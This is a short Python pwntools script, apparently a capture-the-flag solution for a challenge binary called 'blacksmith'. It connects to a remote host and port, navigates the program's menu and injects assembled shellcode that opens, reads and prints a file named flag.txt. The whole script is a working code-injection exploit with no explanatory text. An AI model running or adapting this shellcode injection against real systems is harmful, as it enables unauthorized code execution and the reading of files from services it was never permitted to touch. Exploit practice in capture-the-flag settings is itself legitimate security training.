from pwn import *

context.binary = exe = ELF('blacksmith')

#io = process()
io = remote('206.189.28.180', 31764)

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'> ', b'2')
payload = asm(shellcraft.open('./flag.txt') + shellcraft.read('rax', 'rsp', 50) + shellcraft.write(1, 'rsp', 50))
io.sendlineafter(b'> ', payload)
io.interactive()